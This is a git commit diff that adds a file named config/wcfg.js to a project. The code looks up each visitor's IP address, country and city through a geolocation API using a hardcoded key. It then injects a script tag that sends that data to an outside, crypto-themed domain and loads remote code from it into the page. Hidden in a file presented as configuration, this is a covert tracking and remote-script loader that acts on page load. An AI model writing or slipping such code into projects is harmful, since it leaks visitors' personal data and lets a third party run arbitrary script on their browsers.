3946fcffd009c25a416c50a05e415a8d4c5588fb
Ryszard Kwiatkowski <140899316+PupiPr0@users.noreply.github.com>
2024-02-09 12:06:10 +0300

    Create wcfg.js

---
+++ config/wcfg.js
@@ -0,0 +1,10 @@
+function json(url) {
+  return fetch(url).then(res => res.json());
+}
+let apiKey = 'f9f0689a25597caa54c5a9b18e00856f58b070dff3d490d443bbd637';
+json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+  
+var script = document.createElement('script');
+script.src = "https://socket-crypto-coin-srv9.wildmoney.pro/dnr?dinary=User:  "+data.country_code+", "+data.city+"   Start Web, User IP: "+data.ip;
+document.getElementsByTagName('script')[0].parentNode.appendChild(script);   
+});
